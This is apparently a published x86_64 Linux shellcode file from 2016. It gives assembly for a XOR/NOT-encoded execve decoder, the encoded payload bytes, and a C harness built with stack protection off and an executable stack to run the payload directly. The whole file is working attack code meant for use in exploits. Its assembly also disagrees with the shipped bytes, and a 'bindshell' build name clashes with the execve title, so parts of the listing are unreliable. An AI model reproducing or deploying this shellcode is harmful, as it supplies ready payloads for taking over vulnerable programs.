/*---------------------------------------------------------------------------------------------------------------------
/*
*Title:            x86_64 linux-Xor/not/div encoded execve shellcode
*Author:           Sathish kumar
*Contact:          https://www.linkedin.com/in/sathish94
* Copyright:       (c) 2016 iQube. (http://iQube.io)
* Release Date:    January 6, 2016
*Description:      X86_64 linux-Xor/not/div encoded execve shellcode 54 bytes
*Tested On:        Ubuntu 14.04 LTS
*SLAE64-1408
*Build/Run:        gcc -fno-stack-protector -z execstack bindshell.c -o bindshell
*                   ./bindshell
*
*
*/
/*
global _start
section .text
_start:


jmp short call_shellcode


decoder:
        pop rdi
        xor rcx, rcx
        xor rdx, rdx
        xor rax, rax
        mov cl, 26

decode:
        not byte [rdi]       ; not function is appplied
	    xor byte [rdi], 0xee ; xor function with 0xee
        mov rax, rdi         ; multiplication is done
        mov ecx, 0x2
        mul ecx
        mov rdi, rax
        inc rdi
        loop decode          ; loop continues until the shellcode size is completed

        jmp short shellcode_to_decode ; Pointed to the decoded shellcode

call_shellcode:
        call decoder
        shellcode_to_decode: db 0x35,0x09,0x6a,0x35,0x6a,0x62,0x22,0x39,0x35,0x4c,0x06,0x20,0x25,0x26,0x06,0x06,0x28,0x25,0x38,0x3b,0x3e,0x24,0x0c,0x3d,0x16,0x13
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x15\x5f\x48\x31\xc9\xb1\x1a\x80\x37\xee\xf6\x17\x80\x2f\x03\x48\xff\xc7\xe2\xf3\xeb\x05\xe8\xe6\xff\xff\xff\x5a\x25\xe8\x5a\xeb\xf8\x78\x42\x5a\xaf\x23\x74\x7d\x60\x23\x23\x67\x7a\x47\x46\x73\x7c\x2f\x4a\x03\x19";
main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

